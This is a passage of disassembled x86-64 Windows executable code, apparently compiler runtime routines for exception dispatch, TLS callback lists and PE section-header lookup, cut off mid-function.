   140001e8c:	e8 8f 11 01 00       	call   0x140013020
   140001e91:	84 db                	test   %bl,%bl
   140001e93:	0f 85 c7 00 00 00    	jne    0x140001f60
   140001e99:	e8 d2 f9 ff ff       	call   0x140001870
   140001e9e:	e9 bd 00 00 00       	jmp    0x140001f60
   140001ea3:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   140001ea8:	0f 84 b2 00 00 00    	je     0x140001f60
   140001eae:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   140001eb3:	74 46                	je     0x140001efb
   140001eb5:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   140001eba:	0f 84 a0 00 00 00    	je     0x140001f60
   140001ec0:	eb 61                	jmp    0x140001f23
   140001ec2:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001ec7:	e9 8e 00 00 00       	jmp    0x140001f5a
   140001ecc:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   140001ed1:	75 50                	jne    0x140001f23
   140001ed3:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001ed8:	31 d2                	xor    %edx,%edx
   140001eda:	e8 41 11 01 00       	call   0x140013020
   140001edf:	48 85 c0             	test   %rax,%rax
   140001ee2:	74 3f                	je     0x140001f23
   140001ee4:	48 83 f8 01          	cmp    $0x1,%rax
   140001ee8:	75 64                	jne    0x140001f4e
   140001eea:	ba 01 00 00 00       	mov    $0x1,%edx
   140001eef:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001ef4:	e8 27 11 01 00       	call   0x140013020
   140001ef9:	eb 65                	jmp    0x140001f60
   140001efb:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f00:	31 d2                	xor    %edx,%edx
   140001f02:	e8 19 11 01 00       	call   0x140013020
   140001f07:	48 85 c0             	test   %rax,%rax
   140001f0a:	74 17                	je     0x140001f23
   140001f0c:	48 83 f8 01          	cmp    $0x1,%rax
   140001f10:	75 43                	jne    0x140001f55
   140001f12:	ba 01 00 00 00       	mov    $0x1,%edx
   140001f17:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f1c:	e8 ff 10 01 00       	call   0x140013020
   140001f21:	eb 3d                	jmp    0x140001f60
   140001f23:	48 8b 05 9e bd 50 00 	mov    0x50bd9e(%rip),%rax        # 0x14050dcc8
   140001f2a:	48 85 c0             	test   %rax,%rax
   140001f2d:	74 14                	je     0x140001f43
   140001f2f:	48 8b 15 d2 00 51 00 	mov    0x5100d2(%rip),%rdx        # 0x140512008
   140001f36:	48 89 f9             	mov    %rdi,%rcx
   140001f39:	48 83 c4 20          	add    $0x20,%rsp
   140001f3d:	5b                   	pop    %rbx
   140001f3e:	5f                   	pop    %rdi
   140001f3f:	5e                   	pop    %rsi
   140001f40:	48 ff e2             	rex.W jmp *%rdx
   140001f43:	31 f6                	xor    %esi,%esi
   140001f45:	eb 19                	jmp    0x140001f60
   140001f47:	b3 01                	mov    $0x1,%bl
   140001f49:	e9 19 ff ff ff       	jmp    0x140001e67
   140001f4e:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001f53:	eb 05                	jmp    0x140001f5a
   140001f55:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f5a:	ff 15 a8 00 51 00    	call   *0x5100a8(%rip)        # 0x140512008
   140001f60:	89 f0                	mov    %esi,%eax
   140001f62:	48 83 c4 20          	add    $0x20,%rsp
   140001f66:	5b                   	pop    %rbx
   140001f67:	5f                   	pop    %rdi
   140001f68:	5e                   	pop    %rsi
   140001f69:	c3                   	ret
   140001f6a:	cc                   	int3
   140001f6b:	cc                   	int3
   140001f6c:	cc                   	int3
   140001f6d:	cc                   	int3
   140001f6e:	cc                   	int3
   140001f6f:	cc                   	int3
   140001f70:	ff e0                	jmp    *%rax
   140001f72:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001f79:	1f 84 00 00 00 00 00 
   140001f80:	c3                   	ret
   140001f81:	cc                   	int3
   140001f82:	cc                   	int3
   140001f83:	cc                   	int3
   140001f84:	cc                   	int3
   140001f85:	cc                   	int3
   140001f86:	cc                   	int3
   140001f87:	cc                   	int3
   140001f88:	cc                   	int3
   140001f89:	cc                   	int3
   140001f8a:	cc                   	int3
   140001f8b:	cc                   	int3
   140001f8c:	cc                   	int3
   140001f8d:	cc                   	int3
   140001f8e:	cc                   	int3
   140001f8f:	cc                   	int3
   140001f90:	48 89 c8             	mov    %rcx,%rax
   140001f93:	48 87 05 36 bd 50 00 	xchg   %rax,0x50bd36(%rip)        # 0x14050dcd0
   140001f9a:	c3                   	ret
   140001f9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001fa0:	48 8b 05 29 bd 50 00 	mov    0x50bd29(%rip),%rax        # 0x14050dcd0
   140001fa7:	c3                   	ret
   140001fa8:	cc                   	int3
   140001fa9:	cc                   	int3
   140001faa:	cc                   	int3
   140001fab:	cc                   	int3
   140001fac:	cc                   	int3
   140001fad:	cc                   	int3
   140001fae:	cc                   	int3
   140001faf:	cc                   	int3
   140001fb0:	48 8b 05 39 24 01 00 	mov    0x12439(%rip),%rax        # 0x1400143f0
   140001fb7:	48 8b 00             	mov    (%rax),%rax
   140001fba:	c3                   	ret
   140001fbb:	cc                   	int3
   140001fbc:	cc                   	int3
   140001fbd:	cc                   	int3
   140001fbe:	cc                   	int3
   140001fbf:	cc                   	int3
   140001fc0:	48 8b 05 31 24 01 00 	mov    0x12431(%rip),%rax        # 0x1400143f8
   140001fc7:	48 8b 00             	mov    (%rax),%rax
   140001fca:	c3                   	ret
   140001fcb:	cc                   	int3
   140001fcc:	cc                   	int3
   140001fcd:	cc                   	int3
   140001fce:	cc                   	int3
   140001fcf:	cc                   	int3
   140001fd0:	41 56                	push   %r14
   140001fd2:	56                   	push   %rsi
   140001fd3:	57                   	push   %rdi
   140001fd4:	53                   	push   %rbx
   140001fd5:	48 83 ec 28          	sub    $0x28,%rsp
   140001fd9:	31 f6                	xor    %esi,%esi
   140001fdb:	83 3d f6 bc 50 00 00 	cmpl   $0x0,0x50bcf6(%rip)        # 0x14050dcd8
   140001fe2:	74 54                	je     0x140002038
   140001fe4:	48 89 d7             	mov    %rdx,%rdi
   140001fe7:	89 cb                	mov    %ecx,%ebx
   140001fe9:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001fee:	ba 18 00 00 00       	mov    $0x18,%edx
   140001ff3:	e8 58 10 01 00       	call   0x140013050
   140001ff8:	48 85 c0             	test   %rax,%rax
   140001ffb:	74 36                	je     0x140002033
   140001ffd:	49 89 c6             	mov    %rax,%r14
   140002000:	89 18                	mov    %ebx,(%rax)
   140002002:	48 89 78 08          	mov    %rdi,0x8(%rax)
   140002006:	48 8d 3d d3 bc 50 00 	lea    0x50bcd3(%rip),%rdi        # 0x14050dce0
   14000200d:	48 89 f9             	mov    %rdi,%rcx
   140002010:	ff 15 a2 57 01 00    	call   *0x157a2(%rip)        # 0x1400177b8
   140002016:	48 8b 05 eb bc 50 00 	mov    0x50bceb(%rip),%rax        # 0x14050dd08
   14000201d:	49 89 46 10          	mov    %rax,0x10(%r14)
   140002021:	4c 89 35 e0 bc 50 00 	mov    %r14,0x50bce0(%rip)        # 0x14050dd08
   140002028:	48 89 f9             	mov    %rdi,%rcx
   14000202b:	ff 15 9f 57 01 00    	call   *0x1579f(%rip)        # 0x1400177d0
   140002031:	eb 05                	jmp    0x140002038
   140002033:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140002038:	89 f0                	mov    %esi,%eax
   14000203a:	48 83 c4 28          	add    $0x28,%rsp
   14000203e:	5b                   	pop    %rbx
   14000203f:	5f                   	pop    %rdi
   140002040:	5e                   	pop    %rsi
   140002041:	41 5e                	pop    %r14
   140002043:	c3                   	ret
   140002044:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000204b:	00 00 00 00 00 
   140002050:	56                   	push   %rsi
   140002051:	48 83 ec 20          	sub    $0x20,%rsp
   140002055:	83 3d 7c bc 50 00 00 	cmpl   $0x0,0x50bc7c(%rip)        # 0x14050dcd8
   14000205c:	74 71                	je     0x1400020cf
   14000205e:	89 ce                	mov    %ecx,%esi
   140002060:	48 8d 0d 79 bc 50 00 	lea    0x50bc79(%rip),%rcx        # 0x14050dce0
   140002067:	ff 15 4b 57 01 00    	call   *0x1574b(%rip)        # 0x1400177b8
   14000206d:	48 8b 0d 94 bc 50 00 	mov    0x50bc94(%rip),%rcx        # 0x14050dd08
   140002074:	48 85 c9             	test   %rcx,%rcx
   140002077:	74 49                	je     0x1400020c2
   140002079:	8b 01                	mov    (%rcx),%eax
   14000207b:	39 f0                	cmp    %esi,%eax
   14000207d:	75 04                	jne    0x140002083
   14000207f:	31 c0                	xor    %eax,%eax
   140002081:	eb 24                	jmp    0x1400020a7
   140002083:	48 89 ca             	mov    %rcx,%rdx
   140002086:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000208d:	00 00 00 
   140002090:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140002094:	48 85 c9             	test   %rcx,%rcx
   140002097:	74 29                	je     0x1400020c2
   140002099:	44 8b 01             	mov    (%rcx),%r8d
   14000209c:	48 89 d0             	mov    %rdx,%rax
   14000209f:	48 89 ca             	mov    %rcx,%rdx
   1400020a2:	41 39 f0             	cmp    %esi,%r8d
   1400020a5:	75 e9                	jne    0x140002090
   1400020a7:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   1400020ab:	48 85 c0             	test   %rax,%rax
   1400020ae:	74 06                	je     0x1400020b6
   1400020b0:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400020b4:	eb 07                	jmp    0x1400020bd
   1400020b6:	48 89 15 4b bc 50 00 	mov    %rdx,0x50bc4b(%rip)        # 0x14050dd08
   1400020bd:	e8 9e 0f 01 00       	call   0x140013060
   1400020c2:	48 8d 0d 17 bc 50 00 	lea    0x50bc17(%rip),%rcx        # 0x14050dce0
   1400020c9:	ff 15 01 57 01 00    	call   *0x15701(%rip)        # 0x1400177d0
   1400020cf:	31 c0                	xor    %eax,%eax
   1400020d1:	48 83 c4 20          	add    $0x20,%rsp
   1400020d5:	5e                   	pop    %rsi
   1400020d6:	c3                   	ret
   1400020d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400020de:	00 00 
   1400020e0:	41 56                	push   %r14
   1400020e2:	56                   	push   %rsi
   1400020e3:	57                   	push   %rdi
   1400020e4:	53                   	push   %rbx
   1400020e5:	48 83 ec 28          	sub    $0x28,%rsp
   1400020e9:	83 fa 03             	cmp    $0x3,%edx
   1400020ec:	0f 87 80 01 00 00    	ja     0x140002272
   1400020f2:	89 d0                	mov    %edx,%eax
   1400020f4:	48 8d 0d 05 23 01 00 	lea    0x12305(%rip),%rcx        # 0x140014400
   1400020fb:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   1400020ff:	48 01 c8             	add    %rcx,%rax
   140002102:	ff e0                	jmp    *%rax
   140002104:	83 3d cd bb 50 00 00 	cmpl   $0x0,0x50bbcd(%rip)        # 0x14050dcd8
   14000210b:	0f 84 07 01 00 00    	je     0x140002218
   140002111:	48 8d 0d c8 bb 50 00 	lea    0x50bbc8(%rip),%rcx        # 0x14050dce0
   140002118:	ff 15 9a 56 01 00    	call   *0x1569a(%rip)        # 0x1400177b8
   14000211e:	48 8b 3d e3 bb 50 00 	mov    0x50bbe3(%rip),%rdi        # 0x14050dd08
   140002125:	48 85 ff             	test   %rdi,%rdi
   140002128:	0f 84 dd 00 00 00    	je     0x14000220b
   14000212e:	48 8b 1d b3 56 01 00 	mov    0x156b3(%rip),%rbx        # 0x1400177e8
   140002135:	4c 8b 35 84 56 01 00 	mov    0x15684(%rip),%r14        # 0x1400177c0
   14000213c:	eb 0f                	jmp    0x14000214d
   14000213e:	66 90                	xchg   %ax,%ax
   140002140:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
   140002144:	48 85 ff             	test   %rdi,%rdi
   140002147:	0f 84 be 00 00 00    	je     0x14000220b
   14000214d:	8b 0f                	mov    (%rdi),%ecx
   14000214f:	ff d3                	call   *%rbx
   140002151:	48 89 c6             	mov    %rax,%rsi
   140002154:	41 ff d6             	call   *%r14
   140002157:	85 c0                	test   %eax,%eax
   140002159:	75 e5                	jne    0x140002140
   14000215b:	48 85 f6             	test   %rsi,%rsi
   14000215e:	74 e0                	je     0x140002140
   140002160:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140002164:	48 89 f1             	mov    %rsi,%rcx
   140002167:	ff 15 9b fe 50 00    	call   *0x50fe9b(%rip)        # 0x140512008
   14000216d:	eb d1                	jmp    0x140002140
   14000216f:	83 3d 62 bb 50 00 00 	cmpl   $0x0,0x50bb62(%rip)        # 0x14050dcd8
   140002176:	75 0d                	jne    0x140002185
   140002178:	48 8d 0d 61 bb 50 00 	lea    0x50bb61(%rip),%rcx        # 0x14050dce0
   14000217f:	ff 15 43 56 01 00    	call   *0x15643(%rip)        # 0x1400177c8
   140002185:	c7 05 49 bb 50 00 01 	movl   $0x1,0x50bb49(%rip)        # 0x14050dcd8
   14000218c:	00 00 00 
   14000218f:	e9 de 00 00 00       	jmp    0x140002272
   140002194:	e8 d7 f6 ff ff       	call   0x140001870
   140002199:	e9 d4 00 00 00       	jmp    0x140002272
   14000219e:	83 3d 33 bb 50 00 00 	cmpl   $0x0,0x50bb33(%rip)        # 0x14050dcd8
   1400021a5:	0f 84 c7 00 00 00    	je     0x140002272
   1400021ab:	48 8d 0d 2e bb 50 00 	lea    0x50bb2e(%rip),%rcx        # 0x14050dce0
   1400021b2:	ff 15 00 56 01 00    	call   *0x15600(%rip)        # 0x1400177b8
   1400021b8:	48 8b 3d 49 bb 50 00 	mov    0x50bb49(%rip),%rdi        # 0x14050dd08
   1400021bf:	48 85 ff             	test   %rdi,%rdi
   1400021c2:	0f 84 9d 00 00 00    	je     0x140002265
   1400021c8:	48 8b 1d 19 56 01 00 	mov    0x15619(%rip),%rbx        # 0x1400177e8
   1400021cf:	4c 8b 35 ea 55 01 00 	mov    0x155ea(%rip),%r14        # 0x1400177c0
   1400021d6:	eb 11                	jmp    0x1400021e9
   1400021d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400021df:	00 
   1400021e0:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
   1400021e4:	48 85 ff             	test   %rdi,%rdi
   1400021e7:	74 7c                	je     0x140002265
   1400021e9:	8b 0f                	mov    (%rdi),%ecx
   1400021eb:	ff d3                	call   *%rbx
   1400021ed:	48 89 c6             	mov    %rax,%rsi
   1400021f0:	41 ff d6             	call   *%r14
   1400021f3:	85 c0                	test   %eax,%eax
   1400021f5:	75 e9                	jne    0x1400021e0
   1400021f7:	48 85 f6             	test   %rsi,%rsi
   1400021fa:	74 e4                	je     0x1400021e0
   1400021fc:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140002200:	48 89 f1             	mov    %rsi,%rcx
   140002203:	ff 15 ff fd 50 00    	call   *0x50fdff(%rip)        # 0x140512008
   140002209:	eb d5                	jmp    0x1400021e0
   14000220b:	48 8d 0d ce ba 50 00 	lea    0x50bace(%rip),%rcx        # 0x14050dce0
   140002212:	ff 15 b8 55 01 00    	call   *0x155b8(%rip)        # 0x1400177d0
   140002218:	8b 05 ba ba 50 00    	mov    0x50baba(%rip),%eax        # 0x14050dcd8
   14000221e:	83 f8 01             	cmp    $0x1,%eax
   140002221:	75 4f                	jne    0x140002272
   140002223:	48 8b 0d de ba 50 00 	mov    0x50bade(%rip),%rcx        # 0x14050dd08
   14000222a:	48 85 c9             	test   %rcx,%rcx
   14000222d:	74 12                	je     0x140002241
   14000222f:	90                   	nop
   140002230:	48 8b 71 10          	mov    0x10(%rcx),%rsi
   140002234:	e8 27 0e 01 00       	call   0x140013060
   140002239:	48 89 f1             	mov    %rsi,%rcx
   14000223c:	48 85 f6             	test   %rsi,%rsi
   14000223f:	75 ef                	jne    0x140002230
   140002241:	48 c7 05 bc ba 50 00 	movq   $0x0,0x50babc(%rip)        # 0x14050dd08
   140002248:	00 00 00 00 
   14000224c:	c7 05 82 ba 50 00 00 	movl   $0x0,0x50ba82(%rip)        # 0x14050dcd8
   140002253:	00 00 00 
   140002256:	48 8d 0d 83 ba 50 00 	lea    0x50ba83(%rip),%rcx        # 0x14050dce0
   14000225d:	ff 15 4d 55 01 00    	call   *0x1554d(%rip)        # 0x1400177b0
   140002263:	eb 0d                	jmp    0x140002272
   140002265:	48 8d 0d 74 ba 50 00 	lea    0x50ba74(%rip),%rcx        # 0x14050dce0
   14000226c:	ff 15 5e 55 01 00    	call   *0x1555e(%rip)        # 0x1400177d0
   140002272:	b8 01 00 00 00       	mov    $0x1,%eax
   140002277:	48 83 c4 28          	add    $0x28,%rsp
   14000227b:	5b                   	pop    %rbx
   14000227c:	5f                   	pop    %rdi
   14000227d:	5e                   	pop    %rsi
   14000227e:	41 5e                	pop    %r14
   140002280:	c3                   	ret
   140002281:	cc                   	int3
   140002282:	cc                   	int3
   140002283:	cc                   	int3
   140002284:	cc                   	int3
   140002285:	cc                   	int3
   140002286:	cc                   	int3
   140002287:	cc                   	int3
   140002288:	cc                   	int3
   140002289:	cc                   	int3
   14000228a:	cc                   	int3
   14000228b:	cc                   	int3
   14000228c:	cc                   	int3
   14000228d:	cc                   	int3
   14000228e:	cc                   	int3
   14000228f:	cc                   	int3
   140002290:	56                   	push   %rsi
   140002291:	48 83 ec 20          	sub    $0x20,%rsp
   140002295:	89 ce                	mov    %ecx,%esi
   140002297:	e8 d4 0d 01 00       	call   0x140013070
   14000229c:	89 f1                	mov    %esi,%ecx
   14000229e:	48 8d 0c 49          	lea    (%rcx,%rcx,2),%rcx
   1400022a2:	48 c1 e1 04          	shl    $0x4,%rcx
   1400022a6:	48 01 c8             	add    %rcx,%rax
   1400022a9:	48 83 c4 20          	add    $0x20,%rsp
   1400022ad:	5e                   	pop    %rsi
   1400022ae:	c3                   	ret
   1400022af:	cc                   	int3
   1400022b0:	0f b7 11             	movzwl (%rcx),%edx
   1400022b3:	31 c0                	xor    %eax,%eax
   1400022b5:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   1400022bb:	75 1d                	jne    0x1400022da
   1400022bd:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   1400022c1:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   1400022c8:	75 10                	jne    0x1400022da
   1400022ca:	0f b7 4c 11 18       	movzwl 0x18(%rcx,%rdx,1),%ecx
   1400022cf:	31 c0                	xor    %eax,%eax
   1400022d1:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   1400022d7:	0f 94 c0             	sete   %al
   1400022da:	c3                   	ret
   1400022db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022e0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   1400022e4:	44 0f b7 44 01 06    	movzwl 0x6(%rcx,%rax,1),%r8d
   1400022ea:	45 85 c0             	test   %r8d,%r8d
   1400022ed:	74 2b                	je     0x14000231a
   1400022ef:	48 01 c1             	add    %rax,%rcx
   1400022f2:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400022f6:	48 01 c8             	add    %rcx,%rax
   1400022f9:	48 83 c0 18          	add    $0x18,%rax
   1400022fd:	eb 0a                	jmp    0x140002309
   1400022ff:	90                   	nop
   140002300:	48 83 c0 28          	add    $0x28,%rax
   140002304:	41 ff c8             	dec    %r8d
   140002307:	74 11                	je     0x14000231a
   140002309:	8b 48 0c             	mov    0xc(%rax),%ecx
   14000230c:	48 39 d1             	cmp    %rdx,%rcx
   14000230f:	77 ef                	ja     0x140002300
   140002311:	03 48 08             	add    0x8(%rax),%ecx
   140002314:	48 39 d1             	cmp    %rdx,%rcx
   140002317:	76 e7                	jbe    0x140002300
   140002319:	c3                   	ret
   14000231a:	31 c0                	xor    %eax,%eax
   14000231c:	c3                   	ret
   14000231d:	0f 1f 00             	nopl   (%rax)
   140002320:	56                   	push   %rsi
   140002321:	57                   	push   %rdi
   140002322:	53                   	push   %rbx
   140002323:	48 83 ec 20          	sub    $0x20,%rsp
   140002327:	48 89 ce             	mov    %rcx,%rsi
   14000232a:	e8 31 0c 01 00       	call   0x140012f60
   14000232f:	31 ff                	xor    %edi,%edi
   140002331:	48 83 f8 08          	cmp    $0x8,%rax
   140002335:	77 68                	ja     0x14000239f
   140002337:	48 8b 05 ca 1c 01 00 	mov    0x11cca(%rip),%rax        # 0x140014008
   14000233e:	0f b7 08             	movzwl (%rax),%ecx
   140002341:	81 f9 4d 5a 00 00    	cmp    $0x5a4d,%ecx
   140002347:	75 56                	jne    0x14000239f
   140002349:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000234d:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   140002354:	75 47                	jne    0x14000239d
   140002356:	48 01 c8             	add    %rcx,%rax
   140002359:	0f b7 48 18          	movzwl 0x18(%rax),%ecx
   14000235d:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   140002363:	75 38                	jne    0x14000239d
   140002365:	0f b7 58 06          	movzwl 0x6(%rax),%ebx
   140002369:	85 db                	test   %ebx,%ebx
   14000236b:	74 30                	je     0x14000239d
   14000236d:	0f b7 48 14          	movzwl 0x14(%rax),%ecx
   140002371:	48 8d 3c 01          	lea    (%rcx,%rax,1),%rdi
   140002375:	48 83 c7 18          	add    $0x18,%rdi
   140002379:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002380:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002386:	48 89 f9             	mov    %rdi,%rcx
   140002389:	48 89 f2             	mov    %rsi,%rdx
   14000238c:	e8 ef 0c 01 00       	call   0x140013080
   140002391:	85 c0                	test   %eax,%eax
   140002393:	74 0a                	je     0x14000239f
   140002395:	48 83 c7 28          	add    $0x28,%rdi
   140002399:	ff cb                	dec    %ebx
   14000239b:	75 e3                	jne    0x140002380
   14000239d:	31 ff                	xor    %edi,%edi
   14000239f:	48 89 f8             	mov    %rdi,%rax
   1400023a2:	48 83 c4 20          	add    $0x20,%rsp
   1400023a6:	5b                   	pop    %rbx
   1400023a7:	5f                   	pop    %rdi
   1400023a8:	5e                   	pop    %rsi
   1400023a9:	c3                   	ret
   1400023aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400023b0:	48 8b 05 51 1c 01 00 	mov    0x11c51(%rip),%rax        # 0x140014008
   1400023b7:	0f b7 10             	movzwl (%rax),%edx
   1400023ba:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   1400023c0:	75 5a                	jne    0x14000241c
   1400023c2:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   1400023c6:	81 3c 10 50 45 00 00 	cmpl   $0x4550,(%rax,%rdx,1)
   1400023cd:	75 4d                	jne    0x14000241c
   1400023cf:	48 01 d0             	add    %rdx,%rax
   1400023d2:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400023d6:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   1400023dc:	75 3e                	jne    0x14000241c
   1400023de:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   1400023e2:	85 d2                	test   %edx,%edx
   1400023e4:	74 36                	je     0x14000241c
   1400023e6:	48 2b 0d 1b 1c 01 00 	sub    0x11c1b(%rip),%rcx        # 0x140014008
   1400023ed:	44 0f b7 40 14       	movzwl 0x14(%rax),%r8d
   1400023f2:	4c 01 c0             	add    %r8,%rax
   1400023f5:	48 83 c0 18          	add    $0x18,%rax
   1400023f9:	eb 0d                	jmp    0x140002408
   1400023fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002400:	48 83 c0 28          	add    $0x28,%rax
   140002404:	ff ca                	dec    %edx
   140002406:	74 14                	je     0x14000241c
   140002408:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   14000240c:	4c 39 c1             	cmp    %r8,%rcx
   14000240f:	72 ef                	jb     0x140002400
   140002411:	44 03 40 08          	add    0x8(%rax),%r8d
   140002415:	4c 39 c1             	cmp    %r8,%rcx
   140002418:	73 e6                	jae    0x140002400
   14000241a:	eb 02                	jmp    0x14000241e
   14000241c:	31 c0                	xor    %eax,%eax
   14000241e:	c3                   	ret
   14000241f:	90                   	nop
   140002420:	48 8b 0d e1 1b 01 00 	mov    0x11be1(%rip),%rcx        # 0x140014008
   140002427:	0f b7 11             	movzwl (%rcx),%edx
   14000242a:	31 c0                	xor    %eax,%eax
   14000242c:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   140002432:	75 21                	jne    0x140002455
   140002434:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140002438:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   14000243f:	75 14                	jne    0x140002455
   140002441:	44 0f b7 44 11 18    	movzwl 0x18(%rcx,%rdx,1),%r8d
   140002447:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   14000244e:	75 05                	jne    0x140002455
   140002450:	0f b7 44 11 06       	movzwl 0x6(%rcx,%rdx,1),%eax
   140002455:	c3                   	ret
   140002456:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000245d:	00 00 00 
   140002460:	48 8b 05 a1 1b 01 00 	mov    0x11ba1(%rip),%rax        # 0x140014008
   140002467:	0f b7 10             	movzwl (%rax),%edx
   14000246a:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   140002470:	75 56                	jne    0x1400024c8
   140002472:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   140002476:	81 3c 10 50 45 00 00 	cmpl   $0x4550,(%rax,%rdx,1)
   14000247d:	75 49                	jne    0x1400024c8
   14000247f:	48 01 d0             	add    %rdx,%rax
   140002482:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   140002486:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   14000248c:	75 3a                	jne    0x1400024c8
   14000248e:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   140002492:	85 d2                	test   %edx,%edx
   140002494:	74 32                	je     0x1400024c8
   140002496:	44 0f b7 40 14       	movzwl 0x14(%rax),%r8d
   14000249b:	4c 01 c0             	add    %r8,%rax
   14000249e:	48 83 c0 18          	add    $0x18,%rax
   1400024a2:	eb 14                	jmp    0x1400024b8
   1400024a4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400024ab:	00 00 00 00 00 
   1400024b0:	48 83 c0 28          	add    $0x28,%rax
   1400024b4:	ff ca                	dec    %edx
   1400024b6:	74 10                	je     0x1400024c8
   1400024b8:	f6 40 27 20          	testb  $0x20,0x27(%rax)
   1400024bc:	74 f2                	je     0x1400024b0
   1400024be:	48 85 c9             	test   %rcx,%rcx
   1400024c1:	74 07                	je     0x1400024ca
   1400024c3:	48 ff c9             	dec    %rcx
   1400024c6:	eb e8                	jmp    0x1400024b0
   1400024c8:	31 c0                	xor    %eax,%eax
   1400024ca:	c3                   	ret
   1400024cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400024d0:	48 8b 05 31 1b 01 00 	mov    0x11b31(%rip),%rax        # 0x140014008
   1400024d7:	0f b7 08             	movzwl (%rax),%ecx
   1400024da:	81 f9 4d 5a 00 00    	cmp    $0x5a4d,%ecx
   1400024e0:	75 1a                	jne    0x1400024fc
   1400024e2:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400024e6:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   1400024ed:	75 0d                	jne    0x1400024fc
   1400024ef:	0f b7 4c 08 18       	movzwl 0x18(%rax,%rcx,1),%ecx
   1400024f4:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   1400024fa:	74 02                	je     0x1400024fe
   1400024fc:	31 c0                	xor    %eax,%eax
   1400024fe:	c3                   	ret
   1400024ff:	90                   	nop
   140002500:	48 8b 15 01 1b 01 00 	mov    0x11b01(%rip),%rdx        # 0x140014008
   140002507:	44 0f b7 02          	movzwl (%rdx),%r8d
   14000250b:	31 c0                	xor    %eax,%eax
   14000250d:	41 81 f8 4d 5a 00 00 	cmp    $0x5a4d,%r8d
   140002514:	75 70                	jne    0x140002586
   140002516:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   14000251a:	42 81 3c 02 50 45 00 	cmpl   $0x4550,(%rdx,%r8,1)
   140002521:	00 
   140002522:	75 62                	jne    0x140002586
   140002524:	4c 01 c2             	add    %r8,%rdx
   140002527:	44 0f b7 42 18       	movzwl 0x18(%rdx),%r8d
   14000252c:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   140002533:	75 51                	jne    0x140002586
   140002535:	44 0f b7 42 06       	movzwl 0x6(%rdx),%r8d
   14000253a:	4d 85 c0             	test   %r8,%r8
   14000253d:	74 47                	je     0x140002586
   14000253f:	48 2b 0d c2 1a 01 00 	sub    0x11ac2(%rip),%rcx        # 0x140014008
   140002546:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   14000254a:	48 01 d0             	add    %rdx,%rax
   14000254d:	48 83 c0 18          	add    $0x18,%rax
   140002551:	49 c1 e0 03          	shl    $0x3,%r8
   140002555:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
   140002559:	31 d2                	xor    %edx,%edx
   14000255b:	eb 0c                	jmp    0x140002569
   14000255d:	0f 1f 00             	nopl   (%rax)
   140002560:	48 83 c2 28          	add    $0x28,%rdx
   140002564:	41 39 d0             	cmp    %edx,%r8d
   140002567:	74 1e                	je     0x140002587
